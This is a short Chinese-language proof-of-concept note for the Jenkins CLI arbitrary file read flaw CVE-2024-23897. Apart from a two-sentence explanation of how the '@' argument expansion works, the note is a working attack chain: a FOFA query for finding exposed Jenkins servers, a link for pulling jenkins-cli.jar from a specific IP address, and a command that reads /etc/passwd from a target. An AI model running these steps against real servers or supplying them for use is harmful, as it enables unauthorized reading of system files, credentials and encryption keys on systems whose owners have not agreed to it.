## Jenkins任意文件读取漏洞(CVE-2024-23897)

Jenkins CLI 是 Jenkins 内置的命令行页面。

Jenkins 受影响版本中使用 args4j 库解析CLI命令参数，该库默认将参数中 @ 字符后的文件路径替换为文件内容，攻击者可利用该特性使用 Jenkins 控制器进程的默认字符编码读取 Jenkins 控制器文件系统上的任意文件(如加密密钥的二进制文件)


## fofa
```
app="Jenkins"
```

## 根据社区公布的poc：
```
https://twitter.com/shoucccc/status/1750601321831633026
```

此漏洞需要使用到jenkins-cli.jar。读者可以从任意Jenkins网页地址下载： http://129.146.32.86:8080/jnlpJars/jenkins-cli.jar

```
java -jar jenkins-cli.jar -s http://:8080/ connect-node "@/etc/passwd"
```
![image](https://github.com/wy876/POC/assets/139549762/bba2e17e-472a-4694-b877-c54c3be42a55)
